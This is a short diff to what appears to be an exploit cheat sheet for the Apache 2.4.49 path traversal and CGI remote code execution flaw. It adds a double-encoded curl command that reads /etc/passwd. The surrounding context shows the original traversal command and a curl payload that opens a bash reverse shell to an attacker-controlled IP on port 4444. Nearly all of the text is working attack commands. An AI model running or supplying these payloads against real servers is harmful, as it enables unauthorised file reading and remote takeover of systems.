@@ -101,6 +101,10 @@ read /etc/passwd:
 ```bash
 curl -s --path-as-is -d "echo Content-Type: text/plain; echo; " "$TARGET_IP/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
 ```
+or
+```bash
+curl "http://$TARGET_IP/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd" --data 'echo Content-Type: text/plain; echo;' -s
+```
 execute /bin/bash for a reverse shell in 2.4.49:
 ```bash
 curl -s --path-as-is -d "echo Content-Type: text/plain; echo; bash -c \"bash -i >& /dev/tcp/$LOCAL_IP/4444 0>&1\"" "$TARGET_IP/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
